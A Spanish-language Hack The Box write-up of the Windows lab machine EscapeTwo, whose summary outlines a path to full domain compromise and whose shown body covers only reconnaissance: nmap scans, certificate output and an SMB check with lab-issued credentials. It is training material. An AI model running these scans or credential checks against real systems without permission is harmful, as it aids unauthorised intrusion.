---
title: EscapeTwo
description: EscapeTwo es una máquina Windows de dificultad fácil diseñada en torno a un escenario de compromiso total del dominio, donde se proporcionan credenciales de un usuario con pocos privilegios. Se aprovechan estas credenciales para acceder a un recurso compartido que contiene un documento de Excel corrupto. Modificando su estructura de bytes, se logran extraer credenciales. Estas se utilizan en un ataque de password spraying en el dominio, revelando credenciales válidas de un usuario con acceso a MSSQL, lo que permite obtener acceso inicial. La enumeración del sistema revela nuevas credenciales de SQL, que también se prueban mediante spraying para obtener acceso mediante WinRM. Un análisis posterior del dominio muestra que el usuario tiene permisos WriteOwner sobre una cuenta que gestiona ADCS. Esto permite enumerar Active Directory Certificate Services, revelando una mala configuración. La explotación de esta configuración incorrecta permite recuperar el hash de la cuenta Administrator, lo que lleva finalmente al compromiso completo del dominio.
date: 2025-01-23
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-escapetwo/escapetwo_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - windows
  - hack_the_box
  - tcp
  - dns
  - smb
  - kerberos
  - ldap
  - mssql
  - winrm
  - active_directory
  - data_leaks
  - misconfigurations
  - shadow_credentials_attack
  - tgt
  - pass_the_hash
  - mssql_command_execution
  - hash_dumping
  - adcs_abuse
  - unpac_the_hash
  - information_gathering
  - misconfiguration_exploitation
  - data_leak_exploitation
  - lateral_movement
  - privilege_escalation

---
### Machine Information

As is common in real life Windows pentests, you will start this box with credentials for the following account: `rose` / `KxEPkKe6R8su`

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ ping -c 1 10.10.11.51
PING 10.10.11.51 (10.10.11.51) 56(84) bytes of data.
64 bytes from 10.10.11.51: icmp_seq=1 ttl=127 time=262 ms

--- 10.10.11.51 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 262.486/262.486/262.486/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.51 -n -Pn -oG nmap1
Host: 10.10.11.51 ()    Status: Up
Host: 10.10.11.51 ()    Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 1433/open/tcp//ms-sql-s///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49685/open/tcp/////, 49686/open/tcp/////, 49687/open/tcp/////, 49692/open/tcp/////, 49716/open/tcp/////, 49725/open/tcp/////, 49793/open/tcp/////, 60313/open/tcp/////  Ignored State: filtered (65508)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49685,49686,49687,49692,49716,49725,49793,60313 10.10.11.51 -vvv -oN nmap2
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-11 21:19:16Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
|_ssl-date: 2025-01-11T21:21:03+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
|_ssl-date: 2025-01-11T21:21:02+00:00; -1s from scanner time.
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-01-11T21:21:03+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-01-11T19:02:26
| Not valid after:  2055-01-11T19:02:26
| MD5:   a839:345f:5b24:b589:a50b:6b29:9d36:494d
| SHA-1: b4ba:9346:9024:1dea:a1a4:f7fb:a894:ab00:4574:9bbc
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQG/jE+4JIv7hMg1GTNycudDANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUwMTExMTkwMjI2WhgPMjA1NTAxMTExOTAyMjZaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJnIvlcE
| iuXvv1Smqusi+X6TNdp0spRuYVDWcdUJqVoqFmLm/4TfBn59vMcD/BwDLOT6qHIe
| 8JlrIjvlJ2Xx4YIHmLfu23Nx4vtRHuXbgeg9kUGcAMaI3Q2AAaxqf4LewPEoipz7
| g4pssZnfnoHizzWCky6g6vL+mMhH8I5BwOMzx2XPgZllrhRAnof0OeqUvAhPuWZJ
| GY1JRIuiohb6PaevWj7xUH1suKhKkwrpVvuPTxKk2bBlwIS6s8QkRzNRHsiU8fba
| 94a5FdODY91361stW+xXb2Z10SoKtXvfYNez7VLUI7kVMyW53MrW8mp82zvoKiuc
| bbPitZhKpRAluG0CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAF7QmN3KzeQkIiI1p
| /OoLNcsM5X4pm2hj4PSnv1n0Dhv81vK0qGWi3WLlGGm7u6qyVFcDMW/ILkig5GXE
| xdUS2EQRvIZzn/hbWpAoovC/sqzALaRFp9OuU+xU51owYX4NL+kTa7twWEuSpvgy
| ua6v0eCZPpjJaYCWrD5aHFHSx5v0Q283QmSCODhF4vUr06G9C+GTfM1xD+xvgdcU
| iOU3Il8Ig4DKzy6E4AQiOM08tHxyR25zx2xWsKUGiiufEdp/ysA8QsAtz60g5DrI
| TV1CMgepyIN8Hx9wTrDpcH6nNRNREpOh/tHwuo/wNv7EiUUMBU49cnvpXboavPqY
| mu2Cww==
|_-----END CERTIFICATE-----
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-11T21:21:03+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-11T21:21:02+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49725/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49793/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60313/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-11T21:20:26
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62012/tcp): CLEAN (Timeout)
|   Check 2 (port 24344/tcp): CLEAN (Timeout)
|   Check 3 (port 20179/udp): CLEAN (Timeout)
|   Check 4 (port 45881/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

Identifico el sistema como un DC basado en Windows Server 2019.

```terminal
/home/kali/Documents/htb/machines/escapetwo:-$ nxc smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su'
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
